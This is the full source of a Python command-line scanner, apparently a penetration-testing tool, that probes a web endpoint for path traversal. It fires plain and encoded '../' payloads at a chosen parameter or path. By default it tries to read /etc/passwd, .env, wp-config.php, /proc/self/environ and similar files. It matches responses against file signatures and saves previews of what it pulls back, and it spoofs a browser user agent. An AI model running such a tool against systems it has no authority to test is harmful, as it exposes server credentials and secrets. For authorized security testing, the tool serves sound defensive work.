#!/usr/bin/env python3
"""path-checker: lightweight path traversal scanner."""

import argparse
import concurrent.futures
import json
import logging
import mimetypes
import sys
import threading
import time
from dataclasses import asdict, dataclass, field
from typing import Dict, List, Optional, Tuple

import requests
import urllib3
from requests.exceptions import RequestException
from rich.console import Console
from rich.logging import RichHandler
from rich.progress import Progress, SpinnerColumn, TextColumn, TimeElapsedColumn
from rich.table import Table

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

console = Console()
logger = logging.getLogger("path_checker")
_thread_local = threading.local()


@dataclass
class BaselineResponse:
    status_code: int
    content_length: int
    content_preview: str
    headers: Dict[str, str]


@dataclass
class PathTraversalResult:
    url: str
    status_code: int
    content_length: int
    file_path: str
    traversal_depth: int
    encoding_type: str
    response_time: float
    content_preview: str
    headers: Dict[str, str] = field(default_factory=dict)
    content: bytes = b""
    confidence: str = "low"
    reasons: List[str] = field(default_factory=list)


class PathTraversalScanner:
    def __init__(self, args: argparse.Namespace):
        self.target_url = args.url.rstrip("/")
        self.endpoint = args.endpoint.strip("/")
        self.parameter = args.parameter
        self.max_depth = args.depth
        self.timeout = args.timeout
        self.threads = args.threads
        self.output_file = args.output
        self.verbose = args.verbose
        self.proxy = args.proxy
        self.cookies = self._parse_cookies(args.cookies)
        self.user_agent = args.user_agent
        self.ignore_404 = args.ignore_404
        self.insecure = args.insecure
        self.files_to_test = self._parse_files(args.files)
        self.method = args.method.lower()
        self.injection_location = args.injection_location.lower()
        self.found_vulnerabilities = set()
        self.baseline_response: Optional[BaselineResponse] = None
        self.headers = {
            "User-Agent": self.user_agent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "close",
            "Cache-Control": "no-cache",
        }

    @staticmethod
    def _parse_cookies(cookie_string: Optional[str]) -> Dict[str, str]:
        if not cookie_string:
            return {}
        cookies = {}
        for cookie in cookie_string.split(";"):
            cookie = cookie.strip()
            if "=" in cookie:
                name, value = cookie.split("=", 1)
                cookies[name.strip()] = value.strip()
        return cookies

    @staticmethod
    def _parse_files(files: Optional[str]) -> List[str]:
        default_files = [
            "/etc/passwd",
            ".env",
            "wp-config.php",
            "config.php",
            "web.config",
            "app.config",
            "/proc/self/environ",
            "/etc/hosts",
            "application.properties",
            "database.properties",
            "settings.py",
            "config.yml",
            "index.php",
        ]
        if not files:
            return default_files
        return [item.strip() for item in files.split(",") if item.strip()]

    def _build_target_endpoint(self) -> str:
        if self.endpoint:
            return f"{self.target_url}/{self.endpoint}"
        return self.target_url

    def _build_request_target(self, payload: str) -> Tuple[str, Optional[dict], Optional[dict]]:
        base_url = self._build_target_endpoint()
        if self.injection_location == "path":
            safe_payload = payload.lstrip("/")
            return f"{base_url}/{safe_payload}", None, None

        if self.method == "post":
            return base_url, {self.parameter: payload}, None

        return f"{base_url}?{self.parameter}={payload}", None, None

    def _get_session(self) -> requests.Session:
        if not hasattr(_thread_local, "session"):
            session = requests.Session()
            session.verify = not getattr(self, "insecure", False)
            if self.proxy:
                session.proxies = {"http": self.proxy, "https": self.proxy}
            if self.cookies:
                session.cookies.update(self.cookies)
            _thread_local.session = session
        return _thread_local.session

    def _request(
        self,
        url: str,
        allow_redirects: bool = False,
        data: Optional[dict] = None,
        json_data: Optional[dict] = None,
    ) -> requests.Response:
        session = self._get_session()
        if self.method == "post":
            return session.post(
                url,
                headers=self.headers,
                timeout=self.timeout,
                allow_redirects=allow_redirects,
                data=data,
                json=json_data,
            )
        return session.get(url, headers=self.headers, timeout=self.timeout, allow_redirects=allow_redirects)

    def validate_target_url(self) -> bool:
        endpoint_url = self._build_target_endpoint()
        try:
            if self.verbose:
                logger.info("Validating target endpoint: %s", endpoint_url)
            response = self._request(endpoint_url, allow_redirects=True)
            if response.status_code == 404:
                logger.error("Target endpoint returns 404 Not Found: %s", endpoint_url)
                if not self.ignore_404:
                    logger.error("Use --ignore-404 to continue anyway")
                    return False
                logger.warning("Proceeding despite 404 because --ignore-404 is set")
            elif response.status_code >= 400:
                logger.warning("Target endpoint returned status %s: %s", response.status_code, endpoint_url)
            return True
        except RequestException as exc:
            logger.error("Could not connect to target endpoint: %s", exc)
            return False

    def build_baseline(self) -> Optional[BaselineResponse]:
        impossible_value = "__path_checker_baseline__this_should_not_exist__"
        url, data, json_data = self._build_request_target(impossible_value)
        try:
            response = self._request(url, data=data, json_data=json_data)
            self.baseline_response = BaselineResponse(
                status_code=response.status_code,
                content_length=len(response.content),
                content_preview=response.text[:200].strip(),
                headers=dict(response.headers),
            )
            if self.verbose:
                logger.info(
                    "Baseline established: status=%s len=%s",
                    self.baseline_response.status_code,
                    self.baseline_response.content_length,
                )
            return self.baseline_response
        except RequestException as exc:
            logger.warning("Could not establish baseline: %s", exc)
            return None

    def generate_traversal_payloads(self, file_path: str) -> List[Tuple[str, int, str]]:
        payloads = []
        clean_path = file_path.lstrip("/")
        paths_to_test = [file_path]
        if file_path != clean_path:
            paths_to_test.append(clean_path)

        for path in paths_to_test:
            for depth in range(1, self.max_depth + 1):
                payloads.append(("../" * depth + path, depth, "standard"))
                payloads.append(("%2e%2e%2f" * depth + path, depth, "url-encoded"))
                payloads.append(("%252e%252e%252f" * depth + path, depth, "double-url-encoded"))
                payloads.append(("..%2f" * depth + path, depth, "mixed-encoded"))
                if depth > 1:
                    payloads.append(("../" * (depth - 1) + "a/../" + path, depth, "normalization-bypass"))

        seen = set()
        unique_payloads = []
        for payload in payloads:
            if payload[0] not in seen:
                seen.add(payload[0])
                unique_payloads.append(payload)
        return unique_payloads

    def _content_signature_match(self, file_path: str, content_preview: str, content: bytes) -> List[str]:
        reasons = []
        preview_lower = content_preview.lower()
        filename = file_path.lower()

        if file_path == "/etc/passwd" and ("root:x:" in preview_lower or "daemon:x:" in preview_lower):
            reasons.append("matched /etc/passwd signature")
        if file_path == "/proc/self/environ" and (b"PATH=" in content or b"HOME=" in content):
            reasons.append("matched /proc/self/environ signature")
        if filename.endswith(".env") and ("db_" in preview_lower or "secret" in preview_lower or "api_key" in preview_lower):
            reasons.append("matched .env-like signature")
        if "wp-config.php" in filename and ("db_name" in preview_lower or "db_password" in preview_lower):
            reasons.append("matched wp-config signature")
        if filename.endswith((".ini", ".conf", ".cfg", ".yml", ".yaml", ".properties")) and ("=" in content_preview or ":" in content_preview):
            reasons.append("looks like config content")
        return reasons

    def _binary_like(self, content: bytes) -> bool:
        if not content:
            return False
        sample = content[:256]
        printable = sum(32 <= b <= 126 or b in (9, 10, 13) for b in sample)
        return (printable / len(sample)) < 0.80

    def classify_result(self, result: PathTraversalResult) -> PathTraversalResult:
        score = 0
        reasons = []

        if result.status_code == 200:
            score += 1
            reasons.append("received HTTP 200")

        baseline = self.baseline_response
        if baseline:
            if result.status_code != baseline.status_code:
                score += 2
                reasons.append(f"status differs from baseline ({baseline.status_code})")

            length_delta = abs(result.content_length - baseline.content_length)
            if length_delta > 100:
                score += 1
                reasons.append(f"content length differs from baseline by {length_delta}")

            if result.content_preview and result.content_preview != baseline.content_preview:
                score += 1
                reasons.append("content preview differs from baseline")

        content_type = result.headers.get("Content-Type", "")
        guessed_type, _ = mimetypes.guess_type(result.file_path)
        if guessed_type and guessed_type.split("/")[0] in content_type.lower():
            score += 1
            reasons.append("content-type matches requested file type")
        elif any(x in content_type.lower() for x in ["octet-stream", "text/plain", "application/json", "application/xml"]):
            score += 1
            reasons.append("content-type looks file-like")

        signature_hits = self._content_signature_match(result.file_path, result.content_preview, result.content)
        if signature_hits:
            score += 3
            reasons.extend(signature_hits)

        if self._binary_like(result.content):
            score += 1
            reasons.append("response looks binary / downloadable")

        if score >= 5:
            result.confidence = "high"
        elif score >= 3:
            result.confidence = "medium"
        else:
            result.confidence = "low"
        result.reasons = reasons
        return result

    def test_path_traversal(self, file_path: str, depth: int, encoding_type: str, payload: str) -> Optional[PathTraversalResult]:
        full_url, data, json_data = self._build_request_target(payload)

        if self.verbose:
            logger.debug("Testing payload=%s depth=%s encoding=%s location=%s method=%s", payload, depth, encoding_type, self.injection_location, self.method)

        try:
            start_time = time.time()
            response = self._request(full_url, data=data, json_data=json_data)
            response_time = time.time() - start_time
        except RequestException as exc:
            if self.verbose:
                logger.warning("Request failed for %s: %s", full_url, exc)
            return None

        if response.status_code not in (200, 206, 302, 403):
            return None

        result = PathTraversalResult(
            url=full_url,
            status_code=response.status_code,
            content_length=len(response.content),
            file_path=file_path,
            traversal_depth=depth,
            encoding_type=encoding_type,
            response_time=response_time,
            content_preview=response.text[:200].strip(),
            headers=dict(response.headers),
            content=response.content[:1024],
        )
        result = self.classify_result(result)
        return result

    def scan_file(self, file_path: str) -> List[PathTraversalResult]:
        results = []
        payloads = self.generate_traversal_payloads(file_path)

        if self.verbose:
            logger.info("Testing %s with %d payloads", file_path, len(payloads))

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            future_to_payload = {
                executor.submit(self.test_path_traversal, file_path, depth, encoding_type, payload): (payload, depth, encoding_type)
                for payload, depth, encoding_type in payloads
            }

            for future in concurrent.futures.as_completed(future_to_payload):
                payload, _, _ = future_to_payload[future]
                try:
                    result = future.result()
                except Exception as exc:  # pragma: no cover - defensive CLI catch
                    if self.verbose:
                        logger.error("Worker error for payload %s: %s", payload, exc)
                    continue

                if not result:
                    continue

                dedupe_key = (result.file_path, result.traversal_depth, result.encoding_type, result.status_code, result.content_length)
                if dedupe_key in self.found_vulnerabilities:
                    continue
                self.found_vulnerabilities.add(dedupe_key)
                results.append(result)

                color = {"high": "red", "medium": "yellow", "low": "white"}[result.confidence]
                console.print(f"\n[{color}]Potential finding[{color}] {result.url}")
                console.print(f"File: {result.file_path}")
                console.print(f"Depth: {result.traversal_depth} | Encoding: {result.encoding_type}")
                console.print(f"Status: {result.status_code} | Length: {result.content_length} | Confidence: {result.confidence}")
                if result.reasons:
                    console.print("Reasons: " + "; ".join(result.reasons))
                console.print(f"Preview: {result.content_preview[:120]}")
                console.print("-" * 72)

        return results

    def scan(self) -> List[PathTraversalResult]:
        if not self.validate_target_url():
            logger.error("Validation failed. Aborting.")
            return []

        self.build_baseline()
        all_results = []

        console.print("\nStarting path traversal scan")
        console.print(f"Target: {self._build_target_endpoint()}")
        console.print(f"Method: {self.method.upper()} | Injection: {self.injection_location}")
        if self.baseline_response:
            console.print(
                f"Baseline -> status={self.baseline_response.status_code}, len={self.baseline_response.content_length}"
            )

        with Progress(
            SpinnerColumn(),
            TextColumn("{task.description}"),
            TimeElapsedColumn(),
            console=console,
        ) as progress:
            task = progress.add_task("Scanning...", total=len(self.files_to_test))
            for file_path in self.files_to_test:
                results = self.scan_file(file_path)
                all_results.extend(results)
                progress.update(task, advance=1)

        return all_results

    def save_results(self, results: List[PathTraversalResult]) -> None:
        if not self.output_file:
            return

        serializable = {
            "target_url": self.target_url,
            "endpoint": self.endpoint,
            "parameter": self.parameter,
            "generated_at": time.strftime("%Y-%m-%d %H:%M:%S"),
            "baseline": asdict(self.baseline_response) if self.baseline_response else None,
            "results": [asdict(r) for r in results],
        }
        with open(self.output_file, "w", encoding="utf-8") as handle:
            if self.output_file.lower().endswith(".json"):
                json.dump(serializable, handle, indent=2)
            else:
                handle.write("Path Traversal Scan Results\n")
                handle.write("=" * 60 + "\n\n")
                handle.write(f"Target URL: {self.target_url}\n")
                handle.write(f"Endpoint: {self.endpoint or '/'}\n")
                handle.write(f"Parameter: {self.parameter}\n")
                if self.baseline_response:
                    handle.write(
                        f"Baseline: status={self.baseline_response.status_code}, len={self.baseline_response.content_length}\n"
                    )
                handle.write("\n")
                for result in results:
                    handle.write(f"URL: {result.url}\n")
                    handle.write(f"File: {result.file_path}\n")
                    handle.write(f"Status: {result.status_code}\n")
                    handle.write(f"Length: {result.content_length}\n")
                    handle.write(f"Confidence: {result.confidence}\n")
                    handle.write(f"Reasons: {'; '.join(result.reasons)}\n")
                    handle.write(f"Preview: {result.content_preview}\n")
                    handle.write("-" * 60 + "\n")
        logger.info("Results saved to %s", self.output_file)

    def print_summary(self, results: List[PathTraversalResult]) -> None:
        console.print("\nScan Summary")
        console.print(f"Target: {self._build_target_endpoint()}")
        console.print(f"Method: {self.method.upper()} | Injection: {self.injection_location}")
        console.print(f"Findings: {len(results)}")

        if not results:
            console.print("No suspicious results found with the current configuration.")
            return

        table = Table(show_header=True, header_style="bold cyan")
        table.add_column("Confidence")
        table.add_column("Status")
        table.add_column("File")
        table.add_column("Depth")
        table.add_column("Encoding")
        table.add_column("Length")

        for result in sorted(results, key=lambda r: {"high": 0, "medium": 1, "low": 2}[r.confidence]):
            table.add_row(
                result.confidence,
                str(result.status_code),
                result.file_path,
                str(result.traversal_depth),
                result.encoding_type,
                str(result.content_length),
            )
        console.print(table)


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Path traversal scanner")
    parser.add_argument("-u", "--url", required=True, help="Base target URL")
    parser.add_argument("-e", "--endpoint", default="", help="Endpoint to test")
    parser.add_argument("-p", "--parameter", required=True, help="Parameter name to inject (query/form field)")
    parser.add_argument("-d", "--depth", type=int, default=10, help="Maximum traversal depth")
    parser.add_argument("-t", "--timeout", type=float, default=5.0, help="Request timeout in seconds")
    parser.add_argument("-o", "--output", help="Write findings to a text or JSON file")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose logging")
    parser.add_argument("--threads", type=int, default=10, help="Number of concurrent threads")
    parser.add_argument("--proxy", help="Proxy URL, e.g. http://127.0.0.1:8080")
    parser.add_argument("--user-agent", default="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Safari/537.36", help="Custom User-Agent")
    parser.add_argument("--cookies", help="Cookies string: name1=value1; name2=value2")
    parser.add_argument("--insecure", action="store_true", help="Disable SSL verification")
    parser.add_argument("--files", help="Comma-separated list of files to test")
    parser.add_argument("--ignore-404", action="store_true", help="Continue even if validation returns 404")
    parser.add_argument("--method", choices=["get", "post"], default="get", help="HTTP method to use")
    parser.add_argument("--injection-location", choices=["query", "path"], default="query", help="Inject payload into query parameter or path segment")
    return parser.parse_args()


def configure_logging(verbose: bool) -> None:
    logging.basicConfig(
        level=logging.DEBUG if verbose else logging.INFO,
        format="%(message)s",
        datefmt="[%X]",
        handlers=[RichHandler(rich_tracebacks=True, console=console)],
    )


def main() -> None:
    args = parse_args()
    configure_logging(args.verbose)

    scanner = PathTraversalScanner(args)

    try:
        results = scanner.scan()
        scanner.print_summary(results)
        scanner.save_results(results)
    except KeyboardInterrupt:
        console.print("\n[bold red]Scan interrupted by user[/bold red]")
        sys.exit(1)
    except Exception as exc:  # pragma: no cover - CLI safety net
        logger.error("Unhandled error: %s", exc)
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    main()
